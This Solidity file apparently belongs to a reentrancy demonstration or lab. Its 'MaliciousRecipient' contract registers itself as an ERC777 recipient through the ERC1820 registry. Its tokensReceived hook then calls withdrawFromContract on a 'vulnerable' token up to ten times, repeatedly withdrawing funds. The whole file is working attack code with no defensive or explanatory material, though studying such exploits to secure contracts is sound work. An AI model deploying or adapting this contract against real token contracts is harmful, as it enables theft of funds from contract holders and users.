// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "./Interfaces/IERC1820ImplementerInterface.sol";
import "./Interfaces/IVulnerableAccessToken.sol";


contract MaliciousRecipient is ERC1820ImplementerInterface, IERC777Recipient {
    IERC1820Registry internal immutable _ERC1820_REGISTRY;
    IVulnerableAccessToken public vToken;
    uint256 private _attackCounter;
    uint256 private _amountToWithdraw;

    event GotTokens(
        address operator,
        address from,
        uint256 amount,
        bytes userData,
        bytes operatorData
    );

    constructor(address tokenAddress, uint256 amountToWithdraw,address ERC1820Registry) {
        vToken = IVulnerableAccessToken(tokenAddress);
        _ERC1820_REGISTRY = IERC1820Registry(ERC1820Registry);

        _amountToWithdraw = amountToWithdraw;
        _attackCounter = 0;


        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }

    function callWithdraw() external {
        vToken.withdrawFromContract(_amountToWithdraw);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (_attackCounter < 10) {
            _attackCounter+=1;
            vToken.withdrawFromContract(_amountToWithdraw);
        }

        emit GotTokens(operator, from, amount, userData, operatorData);
    }

    function canImplementInterfaceForAddress(
        bytes32 interfaceHash,
        address addr
    ) external view returns (bytes32) {
        return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));
    }
}